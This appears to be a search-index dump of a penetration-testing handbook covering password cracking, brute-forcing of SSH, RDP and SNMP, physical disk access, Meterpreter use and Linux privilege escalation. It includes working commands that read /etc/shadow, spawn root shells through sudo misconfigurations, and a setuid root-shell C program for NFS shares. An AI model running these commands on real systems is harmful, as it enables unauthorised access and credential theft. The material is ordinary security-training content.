found.txt - where the cracked hash outputs `admin.hash\" - the hash you want to crack. /usr/share/hashcat/rules/rockyou-30000.rule - the wordlist we use hashcat -m 11 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule John the ripper # So this is how you usually crack passwords with john john --wordlist=wordlist.txt dump.txt If you do not find the password you can add the john-rules. Which add numbers and such things to each password. john --rules --wordlist=wordlist.txt dump.txt Linux shadow password # First you need to combine the passwd file with the shadow file using the unshadow-program. unshadow passwd-file.txt shadow-file.txt > unshadowed.txt john --rules --wordlist=wordlist.txt unshadowed.txt Rainbow tables # So basically a rainbow table is a precalculated list of passwords. So instead of having to hash the word you want to try you create a list of hashes. So you do not have to hash them before comparing. This might take a long time to do, hashing a whole wordlist, but when you do the comparison between the password and the test-word it will go a lot faster. SPN - Kerberoasting # ./hashcat-5.0.0/hashcat64.bin -a 0 -m 13100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashar.txt /usr/share/wordlists/rockyou.txt Using Online Tools # findmyhash # You can use findmyhash Here is an example of how to use it: findmyhash LM -h 6c3d4c343f999422aad3b435b51404ee:bcd477bfdb45435a34c6a38403ca4364 Cracking # Crackstation https://crackstation.net/ Hashkiller https://hashkiller.co.uk/ Google hashes Search pastebin. Windows # If you find a local file inclusion vulnerability you might be able to retrieve two fundamental files from it. the system registry and the SAM registry. There two files/registries are all we need to get the machines hashes. These files can be found in several different locations in windows. Here they are: Systemroot can be windows %SYSTEMROOT%\\repair\\SAM windows\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM System file can be found here SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\RegBack\\system So if the manage to get your hands on both of these files you can extract the password hashed like this: pwdump system sam","title":"Offline Password Cracking"},{"location":"password_cracking/offline_password_cracking/#offline-password-cracking","text":"We might find passwords or other credentials in databases. These are often hashed, so we need to first identify which hash it is and then try to crack it. The first step is to identify the hash-algorithm that was used to hash the password.","title":"Offline password cracking"},{"location":"password_cracking/offline_password_cracking/#identify-hash","text":"There are generally speaking three pieces of data we can use to identify a hash. - The length of the hash - The character set - Any special characters In order to identify a hash we can either use specialized tools that analyze the hash and then return a guess on which algorithm it is. An easier way is of course to just look in the documentation of the software where you found the hashes. It usually says in the documentation or the source code which type of hash is being used. In kali we can use hash-identifier or hashid : hash-identifier hashid Or try these online services: http://www.onlinehashcrack.com/hash-identification.php https://md5hashing.net/hash_type_checker","title":"Identify hash"},{"location":"password_cracking/offline_password_cracking/#windows-domain-checking-password-complexity","text":"Find out the password complexity in windows. net accounts /domain net accounts","title":"Windows domain - Checking password complexity"},{"location":"password_cracking/offline_password_cracking/#cracking-the-hash","text":"Okay so now we know what hash it is, let's get cracking. If you want to try out the functionality of hashcat or john the ripper you can find example hashes here: http://openwall.info/wiki/john/sample-hashes.","title":"Cracking the hash"},{"location":"password_cracking/offline_password_cracking/#hashcat","text":"Look for the specific type of hash you want to crack in the list produced by the following command: hashcat --help My hash was a Apache md5, so I will use the corresponding code for it, 1600 -a 0 - straight -o found.txt - where the cracked hash outputs `admin.hash\" - the hash you want to crack. /usr/share/hashcat/rules/rockyou-30000.rule - the wordlist we use hashcat -m 11 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule","title":"Hashcat"},{"location":"password_cracking/offline_password_cracking/#john-the-ripper","text":"So this is how you usually crack passwords with john john --wordlist=wordlist.txt dump.txt If you do not find the password you can add the john-rules. Which add numbers and such things to each password. john --rules --wordlist=wordlist.txt dump.txt","title":"John the ripper"},{"location":"password_cracking/offline_password_cracking/#linux-shadow-password","text":"First you need to combine the passwd file with the shadow file using the unshadow-program. unshadow passwd-file.txt shadow-file.txt > unshadowed.txt john --rules --wordlist=wordlist.txt unshadowed.txt","title":"Linux shadow password"},{"location":"password_cracking/offline_password_cracking/#rainbow-tables","text":"So basically a rainbow table is a precalculated list of passwords. So instead of having to hash the word you want to try you create a list of hashes. So you do not have to hash them before comparing. This might take a long time to do, hashing a whole wordlist, but when you do the comparison between the password and the test-word it will go a lot faster.","title":"Rainbow tables"},{"location":"password_cracking/offline_password_cracking/#spn-kerberoasting","text":"./hashcat-5.0.0/hashcat64.bin -a 0 -m 13100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashar.txt /usr/share/wordlists/rockyou.txt","title":"SPN - Kerberoasting"},{"location":"password_cracking/offline_password_cracking/#using-online-tools","text":"","title":"Using Online Tools"},{"location":"password_cracking/offline_password_cracking/#findmyhash","text":"You can use findmyhash Here is an example of how to use it: findmyhash LM -h 6c3d4c343f999422aad3b435b51404ee:bcd477bfdb45435a34c6a38403ca4364","title":"findmyhash"},{"location":"password_cracking/offline_password_cracking/#cracking","text":"Crackstation https://crackstation.net/ Hashkiller https://hashkiller.co.uk/ Google hashes Search pastebin.","title":"Cracking"},{"location":"password_cracking/offline_password_cracking/#windows","text":"If you find a local file inclusion vulnerability you might be able to retrieve two fundamental files from it. the system registry and the SAM registry. There two files/registries are all we need to get the machines hashes. These files can be found in several different locations in windows. Here they are: Systemroot can be windows %SYSTEMROOT%\\repair\\SAM windows\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM System file can be found here SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\RegBack\\system So if the manage to get your hands on both of these files you can extract the password hashed like this: pwdump system sam","title":"Windows"},{"location":"password_cracking/online_password_cracking/","text":"Online password cracking # There are several tools specialized for bruteforcing online. There are several different services that are common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP. Port 22 - SSH # hydra -l root -P wordlist.txt 192.168.0.101 ssh hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V Port 80/443 htaccess # You can password protect directories with apache pretty easily. Just configure the htaccess (I exaplin this in the chapter on Common ports). It can then be brute forced like this: medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10 Logins # Use Burp suite. Intecept a login attempt. Right-lick \"Send to intruder\". Select Sniper if you have nly one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack. Select your payload, your wordlist. Click attack. Look for response-length that differs from the rest. Port 161 - SNMP # hydra -P wordlist.txt -v 102.168.0.101 snmp Port 3389 - Remote Desktop Protocol # For RDP we can use Ncrack. ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101","title":"Online Password Cracking (Brute force)"},{"location":"password_cracking/online_password_cracking/#online-password-cracking","text":"There are several tools specialized for bruteforcing online. There are several different services that are common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP.","title":"Online password cracking"},{"location":"password_cracking/online_password_cracking/#port-22-ssh","text":"hydra -l root -P wordlist.txt 192.168.0.101 ssh hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V","title":"Port 22 - SSH"},{"location":"password_cracking/online_password_cracking/#port-80443-htaccess","text":"You can password protect directories with apache pretty easily. Just configure the htaccess (I exaplin this in the chapter on Common ports). It can then be brute forced like this: medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10","title":"Port 80/443 htaccess"},{"location":"password_cracking/online_password_cracking/#logins","text":"Use Burp suite. Intecept a login attempt. Right-lick \"Send to intruder\". Select Sniper if you have nly one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack. Select your payload, your wordlist. Click attack. Look for response-length that differs from the rest.","title":"Logins"},{"location":"password_cracking/online_password_cracking/#port-161-snmp","text":"hydra -P wordlist.txt -v 102.168.0.101 snmp","title":"Port 161 - SNMP"},{"location":"password_cracking/online_password_cracking/#port-3389-remote-desktop-protocol","text":"For RDP we can use Ncrack. ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101","title":"Port 3389 - Remote Desktop Protocol"},{"location":"physical_attacks/physical_access_to_machine/","text":"Physical access to machine # So if you have physical access to a machine that is not encrypted it is really trivial to gain access to the hard-drive and all files on it. This is how you do it Create linux-usb # Just follow this guide for ubuntu http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-ubuntu Boot into live-usb on victim machine # If the machine doesn't automatically detect the usb you might have to enter into the bios. This can usually be done by pressing F12 or F1 on boot. Bios looks different from machine to machine. But you need to just choose to boot from the USB-device. Mount disk # Now you have booted into the live-usb, now we need to mount the hard-drive to the usb-linux-filesystem. First we want to find out what partitions we have: sudo su fdisk -l This will give you a list of partitions. They will look something like this /dev/sda1 /dev/sda2 Identify from the list the partition you want to mount. Here we create a space for where we want to mount the partition. mkdir /media/windows mount -t ntfs /dev/sda1 /media/windows -t means type, and refers to the filesystem-type. And we choose ntfs which is the windows-filesystem. Now you can access all the files from the harddrive in /media/windows Umount the disk # Notice that is is umount and not unmount. umount /media/windows Dump the hashes # https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/","title":"Pysical Attacks"},{"location":"physical_attacks/physical_access_to_machine/#physical-access-to-machine","text":"So if you have physical access to a machine that is not encrypted it is really trivial to gain access to the hard-drive and all files on it. This is how you do it","title":"Physical access to machine"},{"location":"physical_attacks/physical_access_to_machine/#create-linux-usb","text":"Just follow this guide for ubuntu http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-ubuntu","title":"Create linux-usb"},{"location":"physical_attacks/physical_access_to_machine/#boot-into-live-usb-on-victim-machine","text":"If the machine doesn't automatically detect the usb you might have to enter into the bios. This can usually be done by pressing F12 or F1 on boot. Bios looks different from machine to machine. But you need to just choose to boot from the USB-device.","title":"Boot into live-usb on victim machine"},{"location":"physical_attacks/physical_access_to_machine/#mount-disk","text":"Now you have booted into the live-usb, now we need to mount the hard-drive to the usb-linux-filesystem. First we want to find out what partitions we have: sudo su fdisk -l This will give you a list of partitions. They will look something like this /dev/sda1 /dev/sda2 Identify from the list the partition you want to mount. Here we create a space for where we want to mount the partition. mkdir /media/windows mount -t ntfs /dev/sda1 /media/windows -t means type, and refers to the filesystem-type. And we choose ntfs which is the windows-filesystem. Now you can access all the files from the harddrive in /media/windows","title":"Mount disk"},{"location":"physical_attacks/physical_access_to_machine/#umount-the-disk","text":"Notice that is is umount and not unmount. umount /media/windows","title":"Umount the disk"},{"location":"physical_attacks/physical_access_to_machine/#dump-the-hashes","text":"https://prakharprasad.com/windows-password-cracking-using-john-the-ripper/","title":"Dump the hashes"},{"location":"post_exploitation/getting_meterpreter_shell/","text":"Meterpreter shell for post-exploitation # By now you probably has some kind of shell to the target. If it is not a meterpreter shell you should probably try to turn the current shell into a meterpreter shell, since it gives you a lot of tools available really easy. So just create a meterpreter-shell from msfvenom or something like that. Maybe a php-shell. Or whatever you have access to. Then you just fire that script and get your meterpreter shell. Check out the chapter Exploiting/Msfvenom for more about creating payloads. Basics # List all commands help Get help about a specific command help upload Sessions # So first some basics. You can put the shell into a background job with the command background . This might be useful if you have several shells going at the same time. Or if you want to move to a specific directory to upload or download some files. List background sessions background -l Connect back to a background session background -i 1 Upload and download files. upload download Scripts # Migrate # A really common and useful script that is build into metasploit is the migrate script. If you get the shell through some kind of exploits that crashes a program the user might shut down that program and it will close your session. So you need to migrate your session to another process. You can do that with the migrate script. First run this command to output all processes ps Now you choose one and run run migrate -p 1327 Where the -p is the PID of the process. Post modules # There are tons of modules specifically created for post-exploitation. They can be found with use post/ Upgrade a normal shell to metepreter # There is a point in doing stuff through metasploit. For example, if you find a exploit that does not have meterpreter available as a payload you can just start a normal shell and then upgrade it. To do that you do the following: First you generate a shell through metasploit, either through a specici exploit or through a msfvenom-shell that you upload. Now that you have a normal shell it is time to upgrade it to a meterpreter shell. First we have to leave the shell but without killing it. So we do Ctr-z Background session 2? [y/N] y Now we have that shell running in the background, and you can see it with show sessions #or sessions -l And you can connect to it again with sessions -i 1 Or whatever the number of the session is. So now we have the shell running in the background. It is time to upgrade use post/multi/manage/shell_to_meterpreter set LHOST 192.168.1.102 set session 1 exploit Now metasploit will create a new session with meterpeter that will be available to you.","title":"Meterpreter for Post-exploitation"},{"location":"post_exploitation/getting_meterpreter_shell/#meterpreter-shell-for-post-exploitation","text":"By now you probably has some kind of shell to the target. If it is not a meterpreter shell you should probably try to turn the current shell into a meterpreter shell, since it gives you a lot of tools available really easy. So just create a meterpreter-shell from msfvenom or something like that. Maybe a php-shell. Or whatever you have access to. Then you just fire that script and get your meterpreter shell. Check out the chapter Exploiting/Msfvenom for more about creating payloads.","title":"Meterpreter shell for post-exploitation"},{"location":"post_exploitation/getting_meterpreter_shell/#basics","text":"List all commands help Get help about a specific command help upload","title":"Basics"},{"location":"post_exploitation/getting_meterpreter_shell/#sessions","text":"So first some basics. You can put the shell into a background job with the command background . This might be useful if you have several shells going at the same time. Or if you want to move to a specific directory to upload or download some files. List background sessions background -l Connect back to a background session background -i 1 Upload and download files. upload download","title":"Sessions"},{"location":"post_exploitation/getting_meterpreter_shell/#scripts","text":"","title":"Scripts"},{"location":"post_exploitation/getting_meterpreter_shell/#migrate","text":"A really common and useful script that is build into metasploit is the migrate script. If you get the shell through some kind of exploits that crashes a program the user might shut down that program and it will close your session. So you need to migrate your session to another process. You can do that with the migrate script. First run this command to output all processes ps Now you choose one and run run migrate -p 1327 Where the -p is the PID of the process.","title":"Migrate"},{"location":"post_exploitation/getting_meterpreter_shell/#post-modules","text":"There are tons of modules specifically created for post-exploitation. They can be found with use post/","title":"Post modules"},{"location":"post_exploitation/getting_meterpreter_shell/#upgrade-a-normal-shell-to-metepreter","text":"There is a point in doing stuff through metasploit. For example, if you find a exploit that does not have meterpreter available as a payload you can just start a normal shell and then upgrade it. To do that you do the following: First you generate a shell through metasploit, either through a specici exploit or through a msfvenom-shell that you upload. Now that you have a normal shell it is time to upgrade it to a meterpreter shell. First we have to leave the shell but without killing it. So we do Ctr-z Background session 2? [y/N] y Now we have that shell running in the background, and you can see it with show sessions #or sessions -l And you can connect to it again with sessions -i 1 Or whatever the number of the session is. So now we have the shell running in the background. It is time to upgrade use post/multi/manage/shell_to_meterpreter set LHOST 192.168.1.102 set session 1 exploit Now metasploit will create a new session with meterpeter that will be available to you.","title":"Upgrade a normal shell to metepreter"},{"location":"post_exploitation/privilege_escalation_-_linux/","text":"Privilege Escalation # Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots. In this chapter I am going to go over these common Linux privilege escalation techniques: Kernel exploits Programs running as root Installed software Weak/reused/plaintext passwords Inside service Suid misconfiguration Abusing sudo-rights World writable scripts invoked by root Bad path configuration Cronjobs Unmounted filesystems Enumeration scripts # I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best. LinEnum https://github.com/rebootuser/LinEnum Here are the options: -k Enter keyword -e Enter export location -t Include thorough (lengthy) tests -r Enter report name -h Displays this help text Unix privesc http://pentestmonkey.net/tools/audit/unix-privesc-check Run the script and save the output in a file, and then grep for warning in it. Linprivchecker.py https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py Privilege Escalation Techniques # Kernel Exploits # By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version. Check the following: OS: Architecture: Kernel version: uname -a cat /proc/version cat /etc/issue Search for exploits site:exploit-db.com kernel version python linprivchecker.py extended Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log . So if you find anything good, put it up on your list and keep searching for other ways before exploiting it. Programs running as root # The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below. Check which processes are running # Metasploit ps # Linux ps aux Mysql If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands: select sys_exec('whoami'); select sys_eval('whoami'); If neither of those work you can use a User Defined Function/ User Installed Software # Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits. # Common locations for user installed software /usr/local/ /usr/local/src /usr/local/bin /opt/ /home /var/ /usr/src/ # Debian dpkg -l # CentOS, OpenSuse, Fedora, RHEL rpm -qa (CentOS / openSUSE ) # OpenBSD, FreeBSD pkg_info Weak/reused/plaintext passwords # Check file where webserver connect to database ( config.php or similar) Check databases for admin passwords that might be reused Check weak passwords username:username username:username1 username:root username:admin username:qwerty username:password Check plaintext password # Anything interesting the the mail? /var/spool/mail ./LinEnum.sh -t -k password Service only available from inside # It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking \"since it is only accessible for the specific user we don't need to spend that much of security\". Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside? # Linux netstat -anlp netstat -ano Suid and Guid Misconfiguration # When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges. For example, these are some programs that can be used to spawn a shell: nmap vim less more If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights: nano cp mv find Find suid and guid files #Find SUID find / -perm -u=s -type f 2>/dev/null #Find GUID find / -perm -g=s -type f 2>/dev/null Abusing sudo-rights # If you have a limited shell that has access to some programs using sudo you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to cp you can overwrite /etc/shadow or /etc/sudoers with your own malicious file. awk awk 'BEGIN {system(\"/bin/bash\")}' bash cp Copy and overwrite /etc/shadow find sudo find / -exec bash -i \\; find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' ; ht The text/binary-editor HT. less From less you can go into vi, and then into a shell. sudo less /etc/shadow v :shell more You need to run more on a file that is bigger than your screen. sudo more /home/pelle/myfile !/bin/bash mv Overwrite /etc/shadow or /etc/sudoers man nano nc nmap python/perl/ruby/lua/etc sudo perl exec \"/bin/bash\"; ctr-d sudo python import os os.system(\"/bin/bash\") sh tcpdump echo $'id\\ncat /etc/shadow' > /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root vi/vim Can be abused like this: sudo vi :shell :set shell=/bin/bash:shell :!bash How I got root with sudo/ World writable scripts invoked as root # If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts. #World writable files directories find / -writable -type d 2>/dev/null find / -perm -222 -type d 2>/dev/null find / -perm -o w -type d 2>/dev/null # World executable folder find / -perm -o x -type d 2>/dev/null # World writable and executable folders find / \\( -perm -o w -perm -o x \\) -type d 2>/dev/null Bad path configuration # Putting . in the path If you put a dot in your path you won't have to write ./binary to be able to execute it. You will be able to execute any script or binary that is in the current directory. Why do people/sysadmins do this? Because they are lazy and won't want to write ./. This explains it https://hackmag.com/security/reach-the-root/ And here http://www.dankalia.com/tutor/01005/0100501004.htm Cronjob # With privileges running script that are editable for other users. Look for anything that is owned by privileged user but writable for you: crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root Unmounted filesystems # Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again. mount\u2008-l cat /etc/fstab NFS Share # If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured. # First check if the target machine has any NFS shares showmount -e 192.168.1.101 # If it does, then mount it to you filesystem mount 192.168.1.101:/ /tmp/ If that succeeds then you can go to /tmp/share . There might be some interesting stuff there. But even if there isn't you might be able to exploit it. If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell. This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this: chmod 4777 exploit #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> int main() { setuid(0); system(\"/bin/bash\"); return 0; } Steal password through a keylogger # If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it. Other useful stuff related to privesc # World writable directories /tmp /var/tmp /dev/shm /var/spool/vbox /var/spool/samba References # http://www.rebootuser.com/?p=1758 http://netsec.ws/?p=309 https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/ Watch this video! http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections https://www.rebootuser.com/?page_id=1721","title":"Local Privilege Escalation - Linux"},{"location":"post_exploitation/privilege_escalation_-_linux/#privilege-escalation","text":"Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots. In this chapter I am going to go over these common Linux privilege escalation techniques: Kernel exploits Programs running as root Installed software Weak/reused/plaintext passwords Inside service Suid misconfiguration Abusing sudo-rights World writable scripts invoked by root Bad path configuration Cronjobs Unmounted filesystems","title":"Privilege Escalation"},{"location":"post_exploitation/privilege_escalation_-_linux/#enumeration-scripts","text":"I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best. LinEnum https://github.com/rebootuser/LinEnum Here are the options: -k Enter keyword -e Enter export location -t Include thorough (lengthy) tests -r Enter report name -h Displays this help text Unix privesc http://pentestmonkey.net/tools/audit/unix-privesc-check Run the script and save the output in a file, and then grep for warning in it. Linprivchecker.py https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py","title":"Enumeration scripts"},{"location":"post_exploitation/privilege_escalation_-_linux/#privilege-escalation-techniques","text":"","title":"Privilege Escalation Techniques"},{"location":"post_exploitation/privilege_escalation_-_linux/#kernel-exploits","text":"By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version. Check the following: OS: Architecture: Kernel version: uname -a cat /proc/version cat /etc/issue Search for exploits site:exploit-db.com kernel version python linprivchecker.py extended Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log . So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.","title":"Kernel Exploits"},{"location":"post_exploitation/privilege_escalation_-_linux/#programs-running-as-root","text":"The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below. Check which processes are running # Metasploit ps # Linux ps aux Mysql If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands: select sys_exec('whoami'); select sys_eval('whoami'); If neither of those work you can use a User Defined Function/","title":"Programs running as root"},{"location":"post_exploitation/privilege_escalation_-_linux/#user-installed-software","text":"Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits. # Common locations for user installed software /usr/local/ /usr/local/src /usr/local/bin /opt/ /home /var/ /usr/src/ # Debian dpkg -l # CentOS, OpenSuse, Fedora, RHEL rpm -qa (CentOS / openSUSE ) # OpenBSD, FreeBSD pkg_info","title":"User Installed Software"},{"location":"post_exploitation/privilege_escalation_-_linux/#weakreusedplaintext-passwords","text":"Check file where webserver connect to database ( config.php or similar) Check databases for admin passwords that might be reused Check weak passwords username:username username:username1 username:root username:admin username:qwerty username:password Check plaintext password # Anything interesting the the mail? /var/spool/mail ./LinEnum.sh -t -k password","title":"Weak/reused/plaintext passwords"},{"location":"post_exploitation/privilege_escalation_-_linux/#service-only-available-from-inside","text":"It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking \"since it is only accessible for the specific user we don't need to spend that much of security\". Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside? # Linux netstat -anlp netstat -ano","title":"Service only available from inside"},{"location":"post_exploitation/privilege_escalation_-_linux/#suid-and-guid-misconfiguration","text":"When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges. For example, these are some programs that can be used to spawn a shell: nmap vim less more If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights: nano cp mv find Find suid and guid files #Find SUID find / -perm -u=s -type f 2>/dev/null #Find GUID find / -perm -g=s -type f 2>/dev/null","title":"Suid and Guid Misconfiguration"},{"location":"post_exploitation/privilege_escalation_-_linux/#abusing-sudo-rights","text":"If you have a limited shell that has access to some programs using sudo you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to cp you can overwrite /etc/shadow or /etc/sudoers with your own malicious file. awk awk 'BEGIN {system(\"/bin/bash\")}' bash cp Copy and overwrite /etc/shadow find sudo find / -exec bash -i \\; find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' ; ht The text/binary-editor HT. less From less you can go into vi, and then into a shell. sudo less /etc/shadow v :shell more You need to run more on a file that is bigger than your screen. sudo more /home/pelle/myfile !/bin/bash mv Overwrite /etc/shadow or /etc/sudoers man nano nc nmap python/perl/ruby/lua/etc sudo perl exec \"/bin/bash\"; ctr-d sudo python import os os.system(\"/bin/bash\") sh tcpdump echo $'id\\ncat /etc/shadow' > /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root vi/vim Can be abused like this: sudo vi :shell :set shell=/bin/bash:shell :!bash How I got root with sudo/","title":"Abusing sudo-rights"},{"location":"post_exploitation/privilege_escalation_-_linux/#world-writable-scripts-invoked-as-root","text":"If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts. #World writable files directories find / -writable -type d 2>/dev/null find / -perm -222 -type d 2>/dev/null find / -perm -o w -type d 2>/dev/null # World executable folder find / -perm -o x -type d 2>/dev/null # World writable and executable folders find / \\( -perm -o w -perm -o x \\) -type d 2>/dev/null","title":"World writable scripts invoked as root"},{"location":"post_exploitation/privilege_escalation_-_linux/#bad-path-configuration","text":"Putting . in the path If you put a dot in your path you won't have to write ./binary to be able to execute it. You will be able to execute any script or binary that is in the current directory. Why do people/sysadmins do this? Because they are lazy and won't want to write ./. This explains it https://hackmag.com/security/reach-the-root/ And here http://www.dankalia.com/tutor/01005/0100501004.htm","title":"Bad path configuration"},{"location":"post_exploitation/privilege_escalation_-_linux/#cronjob","text":"With privileges running script that are editable for other users. Look for anything that is owned by privileged user but writable for you: crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root","title":"Cronjob"},{"location":"post_exploitation/privilege_escalation_-_linux/#unmounted-filesystems","text":"Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again. mount\u2008-l cat /etc/fstab","title":"Unmounted filesystems"},{"location":"post_exploitation/privilege_escalation_-_linux/#nfs-share","text":"If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured. # First check if the target machine has any NFS shares showmount -e 192.168.1.101 # If it does, then mount it to you filesystem mount 192.168.1.101:/ /tmp/ If that succeeds then you can go to /tmp/share . There might be some interesting stuff there. But even if there isn't you might be able to exploit it. If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell. This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this: chmod 4777 exploit #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> int main() { setuid(0); system(\"/bin/bash\"); return 0; }","title":"NFS Share"},{"location":"post_exploitation/privilege_escalation_-_linux/#steal-password-through-a-keylogger","text":"If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.","title":"Steal password through a keylogger"},{"location":"post_exploitation/privilege_escalation_-_linux/#other-useful-stuff-related-to-privesc","text":"World writable directories /tmp /var/tmp /dev/shm /var/spool/vbox /var/spool/samba","title":"Other useful stuff related to privesc"},{"location":"post_exploitation/privilege_escalation_-_linux/#references","text":"http://www.rebootuser.com/?p=1758 http://netsec.ws/?p=309 https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/ Watch this video! http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections https://www.rebootuser.com/?page_id=1721","title":"References"},{"location":"post_exploitation/spawning_shells/","text":"Spawning shells # Non-interactive tty-shell # If you have a non-tty-shell there are certain commands and stuff you can't do. This can happen if you upload reverse shells on a webserver, so that the shell you get is by the user www-data, or similar. These users are not meant to have shells as they don't interact with the system has humans do. So if you don't have a tty-shell you can't run su , sudo for example. This can be annoying if you manage to get a root password but you can't use it. Anyways, if you get one of these shells you can upgrade it to a tty-shell using the following methods: Using python python -c 'import pty; pty.spawn(\"/bin/sh\")' Echo echo 'os.system('/bin/bash')' sh /bin/sh -i bash /bin/bash -i Perl perl -e 'exec \"/bin/sh\";' From within VI :!bash Interactive tty-shell # So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You won't be able to use the up and down arrows, 